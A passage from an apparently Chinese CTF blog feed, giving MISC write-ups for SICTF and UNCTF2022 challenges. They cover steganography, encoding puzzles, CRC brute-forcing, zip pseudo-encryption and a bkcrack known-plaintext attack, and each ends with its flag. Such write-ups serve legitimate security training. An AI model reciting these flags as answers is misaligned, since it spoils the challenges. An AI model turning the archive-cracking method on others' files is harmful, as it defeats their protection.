2)，这个函数就会导致可能是在B通道，可能是在G通道，或者是在R通道，也就是说0的时候是B通道，1的时候是G通道，2的时候是R通道，因为cv2读取图片后就是BGR的通道顺序</p><ol start="4"><li>逆代码如下：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = np.float32(cv2.imread(<span class="string">&#x27;flag.png&#x27;</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">bin_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">for</span> channel <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            channel_img = img[:, :, channel]</span><br><span class="line">            number = cv2.dct(channel_img[<span class="number">8</span> * i:<span class="number">8</span> * i + <span class="number">8</span>, <span class="number">8</span> * j:<span class="number">8</span> * j + <span class="number">8</span>])</span><br><span class="line">            <span class="comment"># print(number[(7, 7)])</span></span><br><span class="line">            <span class="keyword">if</span> number[(<span class="number">7</span>, <span class="number">7</span>)] &gt; <span class="number">10</span>:</span><br><span class="line">                bin_str += <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> number[(<span class="number">7</span>, <span class="number">7</span>)] &lt; -<span class="number">10</span>:</span><br><span class="line">                bin_str += <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bin_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(bin_str))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="linespan><br><span class="line">4096</span><br></pre></td></tr></table></figure><p>原图是512x512，然后8x8的小范围，所以一共就会有<code>4096 bit</code>，我一开始没做出来，是因为我给的条件是<code>number[(7, 7)] &gt; 15</code>或者&#96;&#96;number[(7, 7)] &lt; -15&#96;，导致出现了很多的没匹配到，后面我看了一下长度不对，我就给代码调整到了10和-10</p><ol start="5"><li>然后2进制转Ascii，发现Base系列字符串</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230119134720746.png" alt="image-20230119134720746"></p><ol start="6"><li>解base系列，base58 –&gt; base32 –&gt; base64</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230119134739974.png" alt="image-20230119134739974"></p><ol start="7"><li>我先拿到<a href="https://quipqiup.com/">quipqiup</a>，进行字母频率的在线工具，原理参考<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E6%AF%8D%E9%A2%91%E7%8E%87">维基百科</a> 或者 <a href="https://www.bilibili.com/video/BV1yF411x7dM/?spm_id_from=333.788&vd_source=60cf53bc00c2d4afa9b53e5b9232bdd2">BiliBili Video</a></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230119134847604.png" alt="image-20230119134847604"></p><p>发现得不到结果，这时候肯定不是简单的单表替换了，大概率是<code>维吉尼亚加密的了</code></p><ol start="8"><li>使用<code>https://www.guballa.de/vigenere-solver</code>进行维吉尼亚密码的爆破</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230119135235572.png" alt="image-20230119135235572"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are a good CTFer because you can solve my challenge,next i will give you a flag,my secret is SICTF&#123;5f9c2024-57ef-4b73-be54-3737e36c2bbb&#125;,hava fun!</span><br></pre></td></tr></table></figure><p><strong>SICTF{5f9c2024-57ef-4b73-be54-3737e36c2bbb}</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>UNCTF2022-公开赛-MISC-WriteUp</title>
      <link href="/posts/18746.html"/>
      <url>/posts/18746.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-magic-word-西南科技大学"><a href="#1-magic-word-西南科技大学" class="headerlink" title="1.magic_word-西南科技大学"></a>1.magic_word-西南科技大学</h1><ol><li><code>magic_word.docx</code>后缀改成zip，然后解压，打开<code>\word\document.xml</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117150653246.png"></p><ol start="2"><li><p>复制这一段，必须向上图那样复制，不然末尾一段零宽字符会没复制上</p><p>零宽网站：<code>https://www.mzy0.com/ctftools/zerowidth1/</code></p></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117150803474.png" alt="image-20221117150803474"></p><p><code>unctf&#123;We1come_new_ctfer&#125;</code></p><br><h1 id="2-syslog-浙江师范大学"><a href="#2-syslog-浙江师范大学" class="headerlink" title="2.syslog-浙江师范大学"></a>2.syslog-浙江师范大学</h1><ol><li><p>打开syslog，我搜索了几个关键字，key，password的时候，搜索出现了</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151004951.png" alt="image-20221117151004951"></p></li></ol><p><code>cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA==</code> —&gt; base64 —&gt; <code>password is U6nu2_i3_b3St</code></p><ol start="2"><li>用密码解压flag.zip，得到flag：</li></ol><p><code>unctf&#123;N1_sH3_D0n9_L0g_dE!&#125;</code></p><br><h1 id="3-巨鱼-河南理工大学"><a href="#3-巨鱼-河南理工大学" class="headerlink" title="3.巨鱼-河南理工大学"></a>3.巨鱼-河南理工大学</h1><ol><li>打开fish.png，尾部有zip，我是复制然后粘贴出来的（foremost应该也可以）</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151237958.png" alt="image-20221117151237958"></p><ol start="2"><li>我的看图软件(ImageGlass)打不开图片，所以大概率宽高不对，crc32爆破一下。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151448512.png" alt="image-20221117151448512"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151415578.png" alt="image-20221117151415578"></p><ol start="3"><li>打开图片</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151530713.png" alt="image-20221117151530713"></p><ol start="4"><li>用密码<code>无所谓我会出手</code>，解开之前尾部保存的zip文件，得到<code>flag.txt, flagisnothere.zip </code></li></ol><p><strong>flag.txt：</strong></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151746658.png" alt="image-20221117151746658"></p><p>我提交了一下，是不对的。</p><ol start="5"><li>flagisnothere.zip是伪加密的，我用的<code>ZipCenOp</code>解开的。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151901095.png" alt="image-20221117151901095"></p><p><strong>pass.png:</strong></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117151916643.png" alt="image-20221117151916643"></p><ol start="6"><li>我用识图工具找了一下是<code>六氯环己烷</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152036164.png" alt="image-20221117152036164"></p><p>别名叫六六六，所以flag.pptx的打开密码就是<code>666</code>（当然也是试了好几次出来的）</p><ol start="7"><li>我们要关闭文档保护，也就是不使用密码</li></ol><p>​<img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152221516.png" alt="image-20221117152221516"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152254739.png" alt="image-20221117152254739"></p><p>上面密码留空，然后确定，文档的密码就没了。</p><ol start="8"><li>修改后缀名为zip，然后解压，用vscode打开，<code>ctrl+shift+f</code>搜索unctf</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152443291.png" alt="image-20221117152443291"></p><p><strong>UNCTF{y0u_F1nd_1t!}</strong></p><br><h1 id="4-找得到我吗-闽南师范大学"><a href="#4-找得到我吗-闽南师范大学" class="headerlink" title="4.找得到我吗-闽南师范大学"></a>4.找得到我吗-闽南师范大学</h1><ol><li><p><code>找得到我吗.docx</code>后缀名改成zip，解压。</p></li><li><p>vscode搜索</p></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152706834.png" alt="image-20221117152706834"></p><p><strong>flag{You_find_me!}</strong></p><br><h1 id="5-社什么社-湖南警察学院"><a href="#5-社什么社-湖南警察学院" class="headerlink" title="5.社什么社-湖南警察学院"></a>5.社什么社-湖南警察学院</h1><ol><li>打开txt，放大缩小，弄到一个合适的情况后</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117152938947.png" alt="image-20221117152938947"></p><ol start="2"><li>结合出题人的位置<code>湖南</code>，加上古城。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117153024474.png" alt="image-20221117153024474"></p><p>所以就是<code>凤凰古城</code>，然后md5，再大写。</p><p><strong>UNCTF{4F0198127A45F66C07A5B1A2DDA8223C}</strong></p><br><h1 id="6-zhiyin-中国人民公安大学"><a href="#6-zhiyin-中国人民公安大学" class="headerlink" title="6.zhiyin-中国人民公安大学"></a>6.zhiyin-中国人民公安大学</h1><ol><li>解压后发现<code>lanqiu.jpg</code>打不开，那我们就先解决它。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117153342912.png" alt="image-20221117153342912"></p><p>010editor打开一看就是reverse了，所以我们reverse一下就能回去，这个太简单了，我没写代码，你们不会的百度找个代码吧，我用的是自己的集合的那种脚本。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117153509139.png" alt="image-20221117153509139"></p><p>得到关键字：<code>Go_p1ay</code>（注意是1不是l，我就被这个卡半天了）</p><ol start="2"><li>010editor打开<code>zhiyin.png</code>，尾部明显的morse密码。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117153635833.png" alt="image-20221117153635833"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117153725184.png" alt="image-20221117153725184"></p><p>使用CyberChef，链接：<a href="https://ctf.mzy0.com/CyberChef3/">https://ctf.mzy0.com/CyberChef3/</a></p><p>得到关键字：<code>_UNC7F!!!</code> —&gt; 小写 —&gt; <code>_unc7f!!!</code>（我就因为没有小写，然后解压不开flag.zip，卡了半天）</p><p>所以正确的密码是：<code>Go_p1ay_unc7f!!!</code></p><ol start="3"><li>解压flag.zip，得到flag：</li></ol><p><strong>flag{M1sic_1s_greAt}</strong></p><br><h1 id="7-清和fan-江西警察学院"><a href="#7-清和fan-江西警察学院" class="headerlink" title="7.清和fan-江西警察学院"></a>7.清和fan-江西警察学院</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117154114774.png" alt="image-20221117154114774"></p><p>去哔哩哔哩搜索清和，第一个就是，它的内容刚刚好和手办有关系。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117154206458.png" alt="image-20221117154206458"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_21-49-46.png" alt="Snipaste_2022-11-16_21-49-46"></p><p>所以解压密码为：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/passwd.png" alt="passwd"></p><ol><li><code>MKM.png</code>有lsb隐写，所以解压密码为：<code>qq857488580</code>，解压<code>阿和的真实竟然身份是？.zip</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_21-42-04.png" alt="Snipaste_2022-11-16_21-42-04"></p><ol start="2"><li><code>神秘电波.wav</code>，打开一听就是rot36，再加上36s我更加确定，我使用的是<code>MMSSTV</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_21-45-05.png" alt="Snipaste_2022-11-16_21-45-05"></p><p>又得到关键字：<code>V@mpir3</code>，解压<code>flag.zip</code></p><ol start="3"><li>打开<code>flag.txt</code>，这一看就是有零宽。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117154621741.png" alt="image-20221117154621741"></p><ol start="4"><li>零宽网站：<a href="https://www.mzy0.com/ctftools/zerowidth1/">https://www.mzy0.com/ctftools/zerowidth1/</a></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117154726386.png" alt="image-20221117154726386"></p><p><strong>unctf{wha1e_wants_a_girlfriend_like_alicia}</strong></p><br><h1 id="8-芝麻开门-广东海洋大学"><a href="#8-芝麻开门-广东海洋大学" class="headerlink" title="8.芝麻开门-广东海洋大学"></a>8.芝麻开门-广东海洋大学</h1><ol><li>打开<code>key.txt</code>，找到最下面的<code>a2V5MQ==</code> —&gt; base64 —&gt; <code>key1</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117154850468.png" alt="image-20221117154850468"></p><ol start="2"><li>在StegSolve观察了一下，明显有lsb，再加上给了密码，所以使用<code>cloacked-pixel</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_17-54-28.jpg" alt="Snipaste_2022-11-16_17-54-28"></p><ol start="3"><li>打开<code>out</code>就是看到flag了</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117155158627.png" alt="image-20221117155158627"></p><p><strong>flag{faf5bdd5-ba3d-11da-ad31-d33d75182f1b}</strong></p><p>然后改一下格式：</p><p><strong>UNCTF{faf5bdd5-ba3d-11da-ad31-d33d75182f1b}</strong></p><br><h1 id="9-In-the-Morse-Garden-陆军工程大学"><a href="#9-In-the-Morse-Garden-陆军工程大学" class="headerlink" title="9.In_the_Morse_Garden-陆军工程大学"></a>9.In_the_Morse_Garden-陆军工程大学</h1><ol><li>打开<code>In_the_Morse_Garden.pdf</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117155312556.png" alt="image-20221117155312556"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm +WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5 46b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlO WPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k 5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm +WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y 2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3 lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg54 6b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOW PpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y +k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tnjpvlja Hlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWN oSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7T ljaE=&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>base64解码</li></ol><p><img src="/image-20221117155408567.png" alt="image-20221117155408567"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依古比古玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡依古比古依古比古依古比古 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡依古比古玛卡巴卡玛卡巴卡</span><br></pre></td></tr></table></figure><p>根据题目的Morse的提示，所以这是摩斯密码。</p><p>摩斯密码在线网站：<code>http://www.all-tool.cn/Tools/morse/</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117155548456.png" alt="image-20221117155548456"></p><p><strong>UNCTF{WAN_AN_MAKA_BAKAAAAA!}</strong></p><br><h1 id="10-我小心海也绝非鳝类-中国计量大学现代科技学院"><a href="#10-我小心海也绝非鳝类-中国计量大学现代科技学院" class="headerlink" title="10.我小心海也绝非鳝类-中国计量大学现代科技学院"></a>10.我小心海也绝非鳝类-中国计量大学现代科技学院</h1><ol><li>010editor打开<code>我小心海也绝非鳝类.png</code>，发现尾部base64字符串。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117155717510.png" alt="image-20221117155717510"></p><p><code>RUFTWUxTQg==</code> —&gt; base64 —&gt; <code>EASYLSB</code>，得到关键信息：<code>EASYLSB</code></p><p>2. </p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117155847551.png" alt="image-20221117155847551"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-17_10-17-49.png" alt="Snipaste_2022-11-17_10-17-49"></p><p>得到关键信息：<code>flaginmd5</code></p><ol start="3"><li>使用<code>cloacked-pixel</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-17_11-00-47.png" alt="Snipaste_2022-11-17_11-00-47"></p><ol start="4"><li>得到out</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF</span><br></pre></td></tr></table></figure><ol start="5"><li>根据提示md5，md5的话是32位</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117160036720.png" alt="image-20221117160036720"></p><p>out的文本内容能被32整除，所以大概率就是32位md5代表一个字符，和本次比赛的Crypto方向的md5-1，基本一模一样。写个python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.create dic</span></span><br><span class="line">dic = &#123;hashlib.md5(i.encode()).hexdigest().upper(): i <span class="keyword">for</span> i <span class="keyword">in</span> string.printable&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(dic.get(data[i:i+<span class="number">32</span>]), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117160238887.png" alt="image-20221117160238887"></p><p><strong>flag{welcome_to_misc}</strong></p><p>改一下格式：</p><p><strong>UNCTF{welcome_to_misc}</strong></p><br><h1 id="11-剥茧抽丝-内蒙古警察职业学院"><a href="#11-剥茧抽丝-内蒙古警察职业学院" class="headerlink" title="11.剥茧抽丝-内蒙古警察职业学院"></a>11.剥茧抽丝-内蒙古警察职业学院</h1><p>这题我的wp应该是非常规解法，为什么是非常规，这个锅必须<code>sublime text</code>背！！！</p><ol><li><code>1.txt</code>可以看到是有零宽的</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117160525155.png" alt="image-20221117160525155"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117160629122.png" alt="image-20221117160629122"></p><p>很明显，我得到了乱码，所以这个地方我开始就没做出来。</p><ol start="2"><li>我先来说出题人的正确想法：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117160741481.png" alt="image-20221117160741481"></p><p><code>2.txt</code>的crc32是<code>1E153DBB</code>，原本的<code>1.txt</code>的crc32是<code>5CE71FFF</code>，所以这两个内容肯定不相同，所以不能明文攻击。</p><p>但是，你只要自己新建一个文件，然后写上<code>线索就在眼前，你能利用并找到flag吗</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117161038999.png" alt="image-20221117161038999"></p><p>现在crc32和文件里面的crc32一样了，现在可以用压缩攻击压缩然后明文攻击了。</p><ol start="3"><li>说完出题人，现在说我的解法：</li></ol><p>我为什么没有人出题人的解法呢？因为<code>sublime text</code></p><p>首先，我复制了<code>1.txt</code>的内容到了<code>1 - 副本.txt</code>，然后我把能看见的零宽字符删掉了，也就下图这样：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117161320454.png" alt="image-20221117161320454"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117161348518.png" alt="image-20221117161348518"></p><p>crc32显示<code>c5c55f26</code>，所以我就没办法明文攻击了。</p><p>可能有人就好奇了，为什么你把零宽都删掉了，怎么crc32不一样啊，有没有一种可能，我根本就没把零宽字符删干净，我们把<code>1 - 副本.txt</code>复制到kali里面去。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117161559557.png" alt="image-20221117161559557"></p><p>使用vim打开，你会发现还有一堆的零宽字符，所以说我们根本没有删干净，但是sublime text上面并没有显示零宽字符了！</p><p>所以我就没办法明文攻击，但是虽然不能攻击2.txt，但是我们可以攻击flag.zip。</p><p>为什么可以攻击flag.zip，这是因flag.zip的算法为<code>ZipCrypto Store</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117161803584.png" alt="image-20221117161803584"></p><ol start="4"><li>实现攻击的仓库是用的<code>https://github.com/kimci86/bkcrack</code>，不太会的可以看我之前的一个<a href="https://www.bilibili.com/video/BV1iG411A7yJ/?spm_id_from=333.999.0.0&vd_source=60cf53bc00c2d4afa9b53e5b9232bdd2">视频教程，戳我打开</a>。</li></ol><p>首先我构造了一个zip的文件尾部，但是我当时也没有把握能攻击出来，因为压缩文件如果有注释的话，那我百分比攻击不出来，有注释的话偏移就变了。（也就是以前在这个位置上，现在不在这个位置了）</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117162006342.png" alt="image-20221117162006342"></p><p>攻击命令如下：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_19-21-42.jpg" alt="Snipaste_2022-11-16_19-21-42"></p><p><code>-o 239</code>是根据<code>flag.zip的大小 - 22字节</code>得到的。</p><p><code>-x 0 504B03041400</code>这个是zip的文件头部。</p><p>可以看到成功得到了12字节的key。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_19-32-51.jpg" alt="Snipaste_2022-11-16_19-32-51"></p><p>修改压缩包的密码为<code>easy</code></p><ol start="5"><li>使用密码<code>easy</code>去解压，得到一个新的<code>flag.zip</code>，这里面就是flag了，但是需要密码</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117162452092.png" alt="image-20221117162452092"></p><p>这个压缩包的密码就在一开始零宽里面。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117162541393.png" alt="image-20221117162541393"></p><p>然后我们下载解密后的隐藏数据，使用sublime text打开</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117162623441.png" alt="image-20221117162623441"></p><p>密码：<code>PAsS_w0rD</code></p><p>这个地方花了我很久时间，因为我是真的忘记了还可以隐藏二进制数据，因为上面的文本一直得不到有意义的文字，我滑动到了下面的窗口，然后我试了一下，果然是二进制数据。</p><p>解压<code>新的flag.zip</code>，得到flag：</p><p><strong>unctf{d4a3a242-cd32-4dd5-bac6-84bdf13f527f}</strong></p><p>改一下格式：</p><p><strong>UNCTF{d4a3a242-cd32-4dd5-bac6-84bdf13f527f}</strong></p><br><h1 id="12-MY-PICTURE-信阳师范"><a href="#12-MY-PICTURE-信阳师范" class="headerlink" title="12.MY PICTURE-信阳师范"></a>12.MY PICTURE-信阳师范</h1><ol><li><p><code>Picture</code>添加后缀zip，解压，得到两个文件：<code>dat</code> 和 <code>flag.png</code></p></li><li><p><code>dat</code>用010editor打开乱码，所以我就用我的脚本试了一下，也就是检测文件头和文件尾的，出来了异或<code>0x8e</code></p></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-16_17-57-23.jpg" alt="Snipaste_2022-11-16_17-57-23"></p><p>这个时候就有人说了，那我没有你的脚本这题咋办呢？？也好办！</p><p>你的电脑肯定有python吧，<code>pip3 install 